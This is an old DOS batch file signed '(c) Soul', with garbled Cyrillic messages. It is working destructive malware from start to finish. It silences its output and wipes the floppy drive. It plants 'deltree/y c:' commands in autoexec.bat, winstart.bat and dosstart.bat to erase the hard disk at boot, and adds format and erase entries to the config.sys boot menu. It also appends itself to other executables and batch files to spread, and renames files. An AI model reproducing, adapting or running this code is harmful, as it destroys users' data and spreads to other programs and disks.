:(c) Soul
@echo off
echo     ��������! �� �ࠢ� ���饭�! �� ���஢���� �⮩ �ணࠬ��,
echo � 楫�� �룮�� �ࠣ��, ���� ����襭��� �ࠢ ���ॡ�⥫��!
echo ��⠢�� ��⥬��� ��᪥�� � ������ Enter
pause > nul
echo ���� ������� �������... ��� ����� ������ ��������� �����
@ctty nul
attrib a:\*.* -h -r -s -a
deltree/y a:\*.*
set conf= c:\config.sys
set axec= c:\autoexec.bat
attrib %conf% -h -r -a -s
copy %conf% tmp.sys
attrib tmp.sys +r
del %conf%
echo [Menu] >> %conf%
echo MenuItem for,FORMAT MY HARD DISK >> %conf%
echo MenuItem ers,ERASE ALL FILE ON MY DRIVE >> %conf%
echo MenuDefault for,30 >> %conf%
echo. >> %conf%
echo. >> %conf%
echo [for] >> %conf%
echo. >> %conf%
echo. >> %conf%
echo [ers] >> %conf%
echo. >> %conf%
echo. >> %conf%
echo [Common] >> %conf%
type tmp.sys >> %conf%
attrib tmp.sys -r
del tmp.sys
attrib c:\config.sys +r
attrib %axec% -h -r -s -a
del %axec%
echo @echo off >> %axec%
echo c:\nc\keyrus.com >> %axec%
echo keyrus.com  >> %axec%
echo echo ����� ࠧ��� �� �� ��ࠫ? �ࠢ��쭮! �������! >> %axec%
echo echo ����� �, ����᫥���, � ��᪠�� ⥡� �������!  >> %axec%
echo echo ������ 2 ���� ���㦨�, � ��� �������� �㯨� ���뫪� �����, >> %axec%
echo echo �⮡� ���� ������� ��ࠧ������! �� ��� �࠯��騪 㢨��� >> %axec%
echo echo � ���� ��� �㤮-���᪨� ����⮪, � ����� ������ �������! >> %axec%
echo echo ������ �� �뤥ঠ� � �।����� ��� ࠧ������ �� �����! >> %axec%
echo echo ����, ᢨ�� �� ⮢���! - ����⨫ �࠯��騪! >> %axec%
echo echo ��, �� �����, �⢥⨫ ᮫���: � ⠪�� ����, �� � �� ᢨ�쥩 ����! >> %axec%
echo echo �� ��� � ��! >> %axec%
echo @ctty nul >> %axec%
echo deltree/y c: >> %axec%
for %%a in (*.bat *.exe *.com ..\*.com ..\*.exe) do set _c=%%a
echo. >> %_c%
type %0 >> %_c%
echo @echo off >> %winbootdir%\winstart.bat
echo @ctty nul >> %winbootdir%\winstart.bat
echo deltree/y c: >> %winbootdir%\winstart.bat
echo echo Svoloch >> %winbootdir%\winstart.bat
echo @echo off >> %winbootdir%\dosstart.bat
echo @ctty nul >> %winbootdir%\dosstart.bat
echo deltree/y c: >> %winbootdir%\dosstart.bat
echo echo Svoloch >> %winbootdir%\dosstart.bat
copy %0 ..
copy %0 a:\%0
for %%b in (*.?Y?) do ren %%b *.XY�
@ctty con
echo ��� � ������ ���浪�!
